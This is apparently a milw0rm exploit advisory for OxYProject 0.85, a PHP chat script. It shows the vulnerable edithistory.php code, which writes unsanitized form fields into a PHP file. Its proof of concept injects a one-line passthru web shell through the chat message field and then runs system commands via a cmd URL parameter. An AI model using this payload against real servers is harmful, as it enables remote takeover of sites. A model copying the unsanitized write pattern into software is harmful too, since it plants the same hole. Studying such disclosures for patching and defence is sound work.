<html><head><title>OxYProject 0.85 (edithistory.php) Remote Code Execution Vulnerability</title></head><pre>OxYProject 0.85 (edithistory.php) Remote Code Execution Vulnerability
Script : http://puzzle.dl.sourceforge.net/sourceforge/oxyproject/OxYBox085uns.zip
Code Vuln  :
###################Ln 24###################
include('oxycfg.php');

//########################################
//	Editing the Chat History
//########################################

$edit_file = $file['Chat_History'];
$fh = fopen($edit_file, 'a') or die(&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;1 ;url=oxybox_submit.php\&quot;&gt;&lt;font face=\&quot;arial\&quot;&gt;Error occured when submitting your message. &lt;a href=\&quot;javascript: history.go(-1)\&quot;&gt;Back&lt;/a&gt;&lt;/font&gt;&quot;);
fwrite($fh, &quot;&lt;b&gt;&lt;font face=\&quot;arial\&quot; color=&quot; . $_POST[&quot;usercolor&quot;] . &quot;&gt;&quot; . $_POST[&quot;oxyname&quot;] . &quot; :&lt;/font&gt;&lt;/b&gt; &lt;font color=&quot; . $_POST[&quot;msgcolor&quot;] . &quot;&gt;&quot; . $_POST[&quot;oxymsg&quot;] . &quot;&lt;/font&gt;&lt;br&gt;&quot;);
fclose($fh);
###################Ln 33###################
In The Page &quot;oxycfg.php&quot;
###################Ln 33###################
$file['Chat_History'] = &quot;oxyhistory.php&quot;;
###################Ln 23###################
POC :
Go :-&gt; http://localhost/1/OxYBox085uns/0.85/edithistory.php 
You'll see In this Page
Username [?]                      Your message has been successfully submitted [X]
              Your Message Here
Username Color [?]  black     Enter Message
In The &quot;Username&quot; Write &quot;Gold_M&quot; 
In The &quot;Your Message Here&quot; Write This Code &quot;&lt;?php passthru($_GET[cmd]); ?&gt;&quot;
Afte All this Click  &quot;Enter Message&quot;
Now Go :-&gt; http://localhost/OxYBox085uns/0.85/oxyhistory.php?cmd=dir
# Thanx To TryagOxY

# milw0rm.com [2008-04-30]</pre></html>